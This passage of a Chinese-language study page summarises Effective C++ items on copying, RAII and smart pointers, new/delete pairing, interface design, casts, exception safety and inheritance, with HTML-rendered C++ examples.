class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Matrix</span> &#123;</span><br>    ...<br>    <span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-keyword">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(Matrix &amp;a, Matrix &amp;b)</span> <span class="hljs-keyword">noexcept</span> </span>&#123;<br>        <span class="hljs-keyword">using</span> <span class="hljs-built_in">std</span>::swap; <span class="hljs-comment">// 这一步允许编译器基于ADL寻找合适的swap函数 </span><br>        swap(a.x, b.x);        <br>        swap(a.y, b.y);        <br>        swap(a.data, b.data);    <br>    &#125;<br>    ...<br>&#125;;<br><br>Matrix&lt;T&gt;&amp; Matrix&lt;T&gt;::<span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Matrix &amp;rhs)&#123;    <br>    <span class="hljs-comment">// 检测自赋值    </span><br>    <span class="hljs-keyword">if</span> (&amp;rhs == <span class="hljs-keyword">this</span>) &#123;        <br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;    <br>    &#125;     <br>    Matrix tmp = rhs; <span class="hljs-comment">// copy    </span><br>    swap(tmp, *<span class="hljs-keyword">this</span>); <span class="hljs-comment">// swap    </span><br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-comment">// 甚至于 move and swap</span><br>Matrix&lt;T&gt;&amp; Matrix&lt;T&gt;::<span class="hljs-keyword">operator</span>=(Matrix2 &amp;&amp;rhs) <span class="hljs-keyword">noexcept</span> &#123;    <br>    Matrix2 tmp&#123;<span class="hljs-built_in">std</span>::forward&lt;Matrix2&gt;(rhs)&#125;;    <br>    swap(*<span class="hljs-keyword">this</span>, tmp);    <br>    <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="条款12复制对象时勿忘其每一个成分"><strong>条款12：复制对象时勿忘其每一个成分</strong></span></h3><p>如果你为class添加一个成员变量，你必须同时修改copy函数。你也需要修改class的所有构造函数（见条款4和条款45）以及任何非标准形式的operator=。</p><p>derived class必须复制其baseclass成分。那些成分往往是private（见条款22），所以你无法直接访问它们，应该让derivedclass的copy函数调用相应的base class函数。</p><p>当你编写一个copy函数，请确保复制所有 local 成员变量，调用所有 baseclasses 内的适当的copy函数。</p><p>注意，copy构造函数和copyassignment操作符，可以提取公共操作，但是不能互相嵌套使用。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span>&#123;</span><br><span class="hljs-keyword">private</span>:<br><span class="hljs-built_in">string</span> name;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Derived</span>:</span> <span class="hljs-keyword">public</span> Base&#123;<br><span class="hljs-keyword">public</span>:<br>...<br>Derived(<span class="hljs-keyword">const</span> Derived&amp; rhs);<br>Derived&amp; <span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Derived&amp; rhs);<br>...<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">int</span> priority;<br>&#125;<br><br>Derived::Derived(<span class="hljs-keyword">const</span> Derived&amp; rhs)<br>:Base(rhs), priority(rhs.priority)&#123;<br>...<br>&#125;<br><br><span class="hljs-comment">// copy</span><br>Derived&amp;<br>Derived::<span class="hljs-keyword">operator</span>=(<span class="hljs-keyword">const</span> Derived&amp; rhs)&#123;<br>...<br>Base::<span class="hljs-keyword">operator</span>=(rhs);<br>priority = rhs.priority;<br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2><span id="三-资源管理">三、资源管理</span></h2><p>C++程序中最常使用的资源就是动态分配内存，但内存只是你必须管理的众多资源之一。其他常见的资源还包括文件描述符（filedescriptors）、互斥锁（mutexlocks）、图形界面中的字型和笔刷、数据库连接、以及网络sockets。</p><h3><span id="条款13以对象管理资源"><strong>条款13：以对象管理资源</strong></span></h3><p>把资源放进对象内， C++的“析构函数自动调用机制”确保资源被释放。</p><ul><li><p>获得资源后立刻放进管理对象（managingobject）内。“以对象管理资源”常被称为“资源取得时机便是初始化时机”（ResourceAcquisition IsInitialization；RAII），几乎总是在获得资源后于同一语句内用它初始化某个管理对象。</p></li><li><p>管理对象（managingobject）运用析构函数确保资源被释放。不论控制流如何离开区块，一旦对象被销毁，其析构函数会被自动调用。</p></li><li><p>为防止资源泄漏，请使用RAII对象，它们在构造函数中获得资源并在析构函数中释放资源</p></li><li><p>两个常被使用的RAII classes分别是 std::shared_ptr 和std::auto_ptr。前者通常是较佳选择，因为其copy行为比较直观。若选择auto_ptr，复制动作会使被复制的ptr 指向null。</p></li></ul><p>由于 std::shared_ptr 和 std::auto_ptr 内部析构使用的是 delete 而不是delete[]，所以以下代码是个错误：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">auto_ptr</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">aps</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>[<span class="hljs-number">10</span>])</span></span>;<br><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>&gt; <span class="hljs-title">aps2</span><span class="hljs-params">(<span class="hljs-keyword">new</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span>[<span class="hljs-number">10</span>])</span></span>;<br></code></pre></div></td></tr></table></figure><p>别对动态分配而得到的array使用 std::shared_ptr 和 std::auto_ptr。</p><h3><span id="条款14复制raii对象需要注意"><strong>条款14：复制RAII对象需要注意</strong></span></h3><p>复制 RAII 对象必须一并复制它所管理的资源，所以资源的 copying行为决定RAII对象的 copying 行为。</p><p>处理方法根据对象及其资源的特点决定。</p><ul><li>禁止复制</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lock</span>:</span> <span class="hljs-keyword">private</span> Uncopyable &#123;<br>...<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>对资源进行引用计数。使用 std::shared_ptr（同时可以用 deleter参数传入 function object，控制计数为0时的行为）。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Lock</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Lock</span><span class="hljs-params">(Mutex* pm)</span>: <span class="hljs-title">mutexPtr</span><span class="hljs-params">(pm, unlock)</span></span>&#123;  <span class="hljs-comment">// unlock 为 deleter </span><br>lock(mutexPtr.<span class="hljs-built_in">get</span>());<br>&#125;<br><br><span class="hljs-keyword">private</span>:<br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Mutex&gt; mutexPtr;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>深拷贝资源</li><li>转移资源拥有权，比如使用 std::auto_ptr</li></ul><h3><span id="条款15在资源管理类中提供对原始资源的访问"><strong>条款15：在资源管理类中提供对原始资源的访问</strong></span></h3><p>APIs往往要求访问原始资源（raw resources），所以每一个RAIIclass应该提供一个“访问原始资源”的办法。</p><p>对原始资源的访问可能经由显式转换或隐式转换。一般而言显式转换比较安全，隐式转换更灵活。</p><h3><span id="条款16成对使用new和delete时要采取相同形式"><strong>条款16：成对使用new和delete时要采取相同形式</strong></span></h3><p>当你使用 new，有两件事发生。第一，内存被分配出来（通过名为operatornew的函数，见条款49和条款51）。第二，此内存区域会有一个或多个构造函数被调用。</p><p>当你使用delete，也有两件事发生：第一，资源内存会有一个或多个析构函数被调用；第二，内存才被释放（通过名为operatordelete的函数，见条款51）。</p><p>如果你在new表达式中使用[]，必须在相应的delete表达式中也使用[]。如果你在new表达式中不使用[]，一定不要在相应的delete表达式中使用[]。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">string</span>* p1 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>;<br><span class="hljs-keyword">delete</span> p1;<br><br><span class="hljs-built_in">string</span>* p2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[<span class="hljs-number">10</span>];<br><span class="hljs-keyword">delete</span>[] p2;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-built_in">string</span> Def[<span class="hljs-number">3</span>];<br><span class="hljs-built_in">string</span>* p3 = <span class="hljs-keyword">new</span> Def;<br><span class="hljs-keyword">delete</span>[] p3;<br></code></pre></div></td></tr></table></figure><h3><span id="条款17以独立语句将newed对象置入智能指针"><strong>条款17：以独立语句将newed对象置入智能指针</strong></span></h3><p>理由是C++编译器处理事件顺序的不确定性。</p><p>比如，process传入Widget的ptr，和一个priority()函数：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">process</span>(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt;(<span class="hljs-keyword">new</span> Widget), priority());<br></code></pre></div></td></tr></table></figure><p>执行顺序中，在 new 和 shared_ptr构造函数执行时，priority()的执行出现异常，那么new的对象可能导致资源泄露。</p><p>以独立语句将 newed对象存储于（置入）智能指针内。正确方法：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// 1</span><br><span class="hljs-function"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">shared_ptr</span>&lt;Widget&gt; <span class="hljs-title">pw</span><span class="hljs-params">(<span class="hljs-keyword">new</span> Widget)</span></span>;<br><span class="hljs-comment">// 2</span><br><span class="hljs-built_in">process</span>(pw, priority());<br></code></pre></div></td></tr></table></figure><h2><span id="四-设计与声明">四、设计与声明</span></h2><h3><span id="条款18让接口容易被正确使用不易被误用"><strong>条款18：让接口容易被正确使用，不易被误用</strong></span></h3><ul><li>“促进正确使用”的办法包括：接口的一致性，与内置类型的行为兼容。</li><li>“阻止误用”的办法包括：建立新类型时限制类型上的不必要操作，不让使用者负责资源管理。</li><li>std::shared_ptr 支持定制 customdeleter。可被用来自动解除互斥锁（mutexes；见条款14）。</li></ul><h3><span id="条款19设计class犹如设计type"><strong>条款19：设计class犹如设计type</strong></span></h3><p>设计高效的classes必须了解你面对的问题：</p><ul><li><p>真的需要一个新type吗？如果只是为既有的class添加一些功能，是否单纯定义一或多个non-member函数或templates，就能够达到目的？。</p></li><li><p>新type的对象应该如何被创建和销毁？即class的构造函数、析构函数、内存分配函数和释放函数（operatornew，operator new[]，operator delete和operatordelete[]）的设计。</p></li><li><p>对象的初始化和对象的赋值有什么样的差别？这决定了构造函数和赋值操作符（operator=）的行为差异。别混淆了“初始化”和“赋值”。</p></li><li><p>新type的对象如何被passed by value？即如何设计copyconstructor。</p></li><li><p>考虑type成员变量的取值合法范围。</p></li><li><p>新type的继承关系如何？是否继承自虚基类，是否会被新子类继承，析构函数是否需要为virtual？。</p></li><li><p>新type需要什么样的类型转换？若允许类型 T1被隐式转换为T2，就必须在 class T1 内写一个类型转换操作符（operatorT2）或在 class T2 内写一个 non-explicit-one-argument的构造函数（即，Ctor(int arg1, int arg2=1):m_arg1(arg1),m_arg2(arg2){}）。如果你只允许 explicit构造函数存在，就得写出专门负责执行转换的构造函数，且不能是类型转换操作符（typeconversion operators, 即operator T2）或 non-explicit-one-argument构造函数。</p></li><li><p>什么样的操作符和函数对此新 type而言是合理的？即，需要为class声明哪些member函数，哪些外部全局函数。</p></li><li><p>哪个成员为 public，哪个为protected，哪个为 private，哪一个classes 和/或 functions 应该是friends？</p></li><li><p>新type有是否需要是个class template？。</p></li></ul><h3><span id="条款20宁以passby-reference-to-const替换pass-by-value"><strong>条款20：宁以passby reference to const替换pass by value</strong></span></h3><p>默认情况下C++以pass byvalue方式（一个继承自C的方式）传递对象至函数。默认函数参数都是以实参的副本为初值，而调用端所获得的也是函数返回值的一个副本，由对象的copy构造函数生成，这可能使得pass by value成为费时的操作。</p><p>pass by reference toconst这种传递方式，没有任何构造函数或析构函数被调用，因为没有任何新对象被创建。</p><p>以byreference方式传递参数也可以避免slicing（对象切割）问题。当一个derivedclass对象以by value方式传递并被视为一个base class对象，baseclass的copy构造函数会被调用，而没有初始化derived class的部分。</p><ul><li>尽量以pass-by-reference-to-const替换pass-by-value。前者通常比较高效，并可避免切割问题（slicingproblem）。</li><li>以上规则并不适用于内置类型，以及 STL的迭代器和函数对象。对它们而言，pass-by-value往往比较适当。STL的迭代器和函数是基于C指针实现的。</li></ul><h3><span id="条款21必须返回对象时别返回其reference"><strong>条款21：必须返回对象时，别返回其reference</strong></span></h3><ol type="1"><li>绝对不要返回pointer或reference指向一个local stack对象</li><li>绝对不要返回reference指向一个heap-allocated对象</li></ol><h3><span id="条款22将成员变量声明为private"><strong>条款22：将成员变量声明为private</strong></span></h3><p>从封装的角度观之，其实只有两种访问权限：private（提供封装）和其他（不提供封装）。</p><ul><li>切记将成员变量声明为private。</li><li>protected并不比public更具封装性。</li></ul><h3><span id="条款23宁以non-member-non-friend替换member函数"><strong>条款23：宁以non-member、non-friend替换member函数</strong></span></h3><p>宁可拿non-member、non-friend函数替换member函数。这样做可以增加封装性、包装弹性（packagingflexibility）和可扩展性。</p><h3><span id="条款24若所有参数皆需类型转换请为此采用non-member函数"><strong>条款24：若所有参数皆需类型转换，请为此采用non-member函数</strong></span></h3><p>如果你需要为某个成员函数的所有参数（包括this指针参数）进行类型转换，那么这个函数必须是个non-member。<code>const T operator*(const T&amp; lhs, const T&amp; rhs)</code>。</p><h3><span id="条款25考虑写出一个不抛异常的swap函数"><strong>条款25：考虑写出一个不抛异常的swap函数</strong></span></h3><ul><li>当std::swap对你的类型效率不高时，提供一个swap成员函数，并确定这个函数不抛出异常。</li><li>如果你提供一个member swap，也该提供一个non-memberswap用来调用前者。</li><li>调用swap时应针对std::swap使用using声明式，然后调用swap并且不带任何“命名空间资格修饰”。</li><li>为“用户定义类型”进行stdtemplates全特化是好的，但千万不要更改std::swap原来的实现。</li></ul><h2><span id="五-实现">五、实现</span></h2><h3><span id="条款26尽可能延后变量定义式的出现时间"><strong>条款26：尽可能延后变量定义式的出现时间</strong></span></h3><p>尽可能延后变量定义式的出现，尽可能在使用变量前定义变量，尽可能在变量赋初值时定义变量。这样做可增加程序的清晰度并改善程序效率。</p><h3><span id="条款27尽量少做转型动作"><strong>条款27：尽量少做转型动作</strong></span></h3><ul><li>const_cast 通常被用来将对象的常量性转除（cast away theconstness）。它也是唯一有此能力的C++-style转型操作符。</li><li>dynamic_cast 主要用来执行“安全向下转型”（safedowncasting），也就是用来决定某对象是否归属继承体系中的某个类型。它是唯一可能耗费重大运行成本的转型动作。</li><li>reinterpret_cast意图执行低级转型，实际运行情况取决于编译器，这也就表示它不可移植。例如将一个pointerto int转型为一个int。</li><li>static_cast 用来强迫隐式转换（implicitconversions），例如将non-const 对象转为 const 对象（条款3），或将 int转为 double 等等。将 void* 指针转为某类型 typed指针，将pointer-to-base转为pointer-to-derived。但它无法将const转为non-const——这个只有const_cast才办得到。</li></ul><p>请记住：</p><ul><li>如果可以，尽量避免转型，特别是在注重效率的代码中避免dynamic_casts。如果有个设计需要转型动作，试着发展无需转型的替代设计。</li><li>如果转型是必要的，试着将它包装成某个函数。客户随后可以调用该函数，而不需将转型放进他们自己的代码内。</li><li>宁可使用C++-style（新式）转型，不要使用旧式转型。</li></ul><h3><span id="条款28避免返回handles指向对象内部成分"><strong>条款28：避免返回handles指向对象内部成分</strong></span></h3><p>如果const成员函数传出一个reference指向成员变量，函数运行结果又被存储于对象外部，那么这个函数的调用者就可以通过reference修改对象的内部成员。</p><p>避免返回handles（包括references、指针、迭代器）指向对象内部。遵守这个条款可增加封装性，帮助const 成员函数的行为像个 const，并将发生 dangling handles的可能性降至最低。</p><h3><span id="条款29为异常安全而努力是值得的"><strong>条款29：为“异常安全”而努力是值得的</strong></span></h3><p>异常安全函数（Exception-safe functions）提供以下三个保证之一：</p><ol type="1"><li>基本型保证：如果异常被抛出，程序内的任何事物仍然保持在有效状态下。</li><li>强烈型保证：如果异常被抛出，程序状态不改变。如果函数成功，就没有异常出现；如果函数失败，程序会回退到“调用函数之前”的状态。</li><li>不抛掷（nothrow）保证：承诺绝不抛出异常，因为它们总是能够完成它们其设计的功能。</li></ol><p>异常安全码（Exception-safecode）必须提供上述三种保证之一。如果它不这样做，它就不具备异常安全性。</p><p>强烈型异常安全的一种实践：copy andswap。原则很简单：为你打算修改的对象做出一份副本，然后对副本做一切必要修改。若有任何修改动作抛出异常，原对象仍保持未改变状态。待所有改变都成功后，再将副本和原对象在一个不抛出异常的操作中置换（swap）。</p><ul><li>异常安全函数（Exception-safefunctions）即使发生异常也不会泄漏资源或允许任何数据结构败坏。</li><li>“强烈保证”往往能够以 copy-and-swap实现出来，但“强烈保证”并非对所有函数都可实现或具备现实意义。</li></ul><h3><span id="条款30透彻了解inline的里里外外"><strong>条款30：透彻了解inline的里里外外</strong></span></h3><ul><li>将inline限制在小型、被频繁调用的函数身上。这可使日后的调试过程和二进制升级（binaryupgradability）更容易，也可使潜在的代码膨胀问题最小化，使程序的速度提升机会最大化。</li><li>不要只因为functiontemplates出现在头文件，就将它们声明为inline。</li><li><strong>!!! important!!!</strong>:现代C、C++编译器，会自动优化代码，程序中 inline已经只算是一种提示符，并不具备编译层面上的绝对含义。所以，忘了它也无妨。</li></ul><h3><span id="条款31将文件间的编译依存关系降至最低"><strong>条款31：将文件间的编译依存关系降至最低</strong></span></h3><ul><li>支持“编译依存性最小化”的一般构想是：依赖声明，不要依赖定义。</li><li>程序库头文件应该以“完全且仅有声明式”（full anddeclaration-onlyforms）的形式存在。这种做法不论是否涉及templates都适用。</li></ul><h2><span id="六-继承与面向对象设计">六、继承与面向对象设计</span></h2><h3><span id="条款32确定你的public继承塑模出is-a关系"><strong>条款32：确定你的public继承塑模出is-a关系</strong></span></h3><p>public inheritance 意味 "is-a" 的关系。适用于baseclasses身上的每一件事情一定也适用于derivedclasses身上，因为每一个derived class对象也都是一个base class对象。</p><h3><span id="条款33避免覆盖继承而来的名称"><strong>条款33：避免覆盖继承而来的名称</strong></span></h3><p>为了让被遮掩的名称再见天日，可使用 using 声明式或转交函数（forwardingfunctions）。</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Base</span> &#123;</span><br>    <span class="hljs-keyword">int</span> x;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f1</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f2</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f3</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f3</span><span class="hljs-params">(<span class="hljs-keyword">double</span>)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f5</span><span class="hljs-params">()</span></span>;<br>    ...<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Derievd</span>:</span> <span class="hljs-keyword">public</span> Base &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">using</span> Base::f1;<br>    <span class="hljs-keyword">using</span> Base::f3;<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f3</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f4</span><span class="hljs-params">()</span></span>;<br>    <span class="hljs-comment">// fowarding function</span><br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">f5</span><span class="hljs-params">()</span> </span>&#123;<br>        Base::f5();<br>    &#125;<br>    ...<br>&#125;;<br><br>Derived d;<br><span class="hljs-keyword">int</span> x = <span class="hljs-number">1</span>;<br>d.f1();  <span class="hljs-comment">// Derived::f1</span><br>d.f1(x); <span class="hljs-comment">// Base::f1</span><br>d.f2();  <span class="hljs-comment">// Base::f2</span><br>d.f3();  <span class="hljs-comment">// Derived::f3</span><br>d.f3(x); <span class="hljs-comment">// Base::f3</span><br>d.f4();  <span class="hljs-comment">// Derived::f4</span><br>d.f5();  <span class="hljs-comment">// Derived::f5, 转到Base::f5()</span><br></code></pre></div></td></tr></table></figure><h3><span id="条款34区分接口继承和实现继承"><strong>条款34：区分接口继承和实现继承</strong></span></h3><p>函数接口（functioninterfaces）继承和函数实现（functionimplementations）继承。</p><ul><li>声明一个pure virtual函数的目的是为了让derivedclasses只继承函数接口。</li><li>声明简朴的（非纯）impure virtual函数的目的，是让derivedclasses继承该函数的接口和缺省实现，必要情况下，缺省实现可以单独设计为一个成员函数，而接口设计为purevirtual函数，防止缺省实现被误用。</li><li>声明non-virtual函数的目的是为了令derivedclasses继承函数的接口及一份强制性实现，比如设计每个对象都相同且必要的ID生成方法。</li></ul><h3><span id="条款35考虑virtual函数以外的其他选择"><strong>条款35：考虑virtual函数以外的其他选择</strong></span></h3><ul><li>virtual函数的替代方案包括 NVI(Non-Virtual Interface)手法及Strategy设计模式的多种形式。NVI手法自身是一个特殊形式的TemplateMethod设计模式。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//  NVI(Non-Virtual Interface) </span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">score</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;  <span class="hljs-comment">// non-virtual, 子类不重载</span><br>        ...<br>        <span class="hljs-keyword">int</span> val = doScore();<br>        ...<br>        <span class="hljs-keyword">return</span> val;<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">int</span> <span class="hljs-title">doScore</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;  <span class="hljs-comment">// 子类重载</span><br>        ...<br>    &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>将功能从成员函数移到class外部函数，带来的一个缺点是，非成员函数无法访问class的non-public成员。</li><li>std::function对象的行为就像一般函数指针。这样的对象可接纳，函数签名（targetsignature）一致的所有可调用对象（callable entities）。</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">// declare</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>;</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">defaultLearnStrategy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Person&amp; pp)</span></span>;<br><br><span class="hljs-comment">// defination</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-built_in">std</span>::function&lt;<span class="hljs-keyword">int</span>(<span class="hljs-keyword">const</span> Person&amp;)&gt; learnStrat;<br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">Person</span><span class="hljs-params">(learnStrat lst=defaultLearnStrategy)</span>:</span><br><span class="hljs-function">    <span class="hljs-title">stratFunc</span><span class="hljs-params">(lst)</span> </span>&#123;<br>    ...    <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">score</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> stratFunc(*<span class="hljs-keyword">this</span>);<br>    &#125;<br><span class="hljs-keyword">private</span>:<br>    learnStrat stratFunc;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">readStrategy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Person&amp;)</span> </span>&#123;<br>    ...<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">writeStrategy</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Person&amp;)</span> </span>&#123;<br>    ...<br>&#125;;<br><br>...<br><span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(readStrategy)</span></span>;<br><span class="hljs-function">Person <span class="hljs-title">p2</span><span 